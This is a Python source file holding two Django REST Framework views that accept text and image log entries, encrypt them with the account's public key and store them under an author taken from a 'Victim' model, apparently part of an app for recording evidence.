import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from rest_framework import generics, permissions
from rest_framework.parsers import FileUploadParser
from rest_framework.response import Response
from api.serializers import AddTextLogSerializer, AddImageLogSerializer
from api.models import Log, ImageLog, Account, Victim
from api.encryption import encrypt_content


class AddTextLogAPI(generics.GenericAPIView):
    permission_classes = [permissions.IsAuthenticated]

    def put(self, request):
        serializer = AddTextLogSerializer(data=request.data)
        # try:
        serializer.is_valid(raise_exception=True)
        data = serializer.data

        # Encrypt the log
        public_key = Account.objects.filter(
            id=request.user.id)[0].encrypt_pk
        encrypted_title, encrypted_content, encrypted_sym_key = encrypt_content(
            data['title'], data['content'], public_key)

        author = Victim.objects.filter(account=request.user)[0]
        log = Log(
            author=author,
            title=encrypted_title,
            content=encrypted_content,
            encrypted_sym_key=encrypted_sym_key,
        )
        log.save()

        return Response(status=201)
        # except:
        #     return Response(status=500)


class AddImageLogAPI(generics.GenericAPIView):
    parser_class = (FileUploadParser,)

    def put(self, request):
        serializer = AddImageLogSerializer(data=request.data)

        serializer.is_valid(raise_exception=True)
        data = serializer.data
        image_obj = request.FILES['image']
        encoded_image = base64.b64encode(image_obj.read())

        public_key = Account.objects.filter(
            id=request.user.id)[0].encrypt_pk

        author = Victim.objects.filter(account=request.user)[0]
        encrypted_title, encrypted_image, encrypted_sym_key = encrypt_content(
            data['title'], encoded_image, public_key)
        image_log = ImageLog(
            author=author,
            title=encrypted_title,
            image=encrypted_image,
            encrypted_sym_key=encrypted_sym_key
        )
        image_log.save()

        return Response(status=201)
        # except:
        #     return Response(status=500)
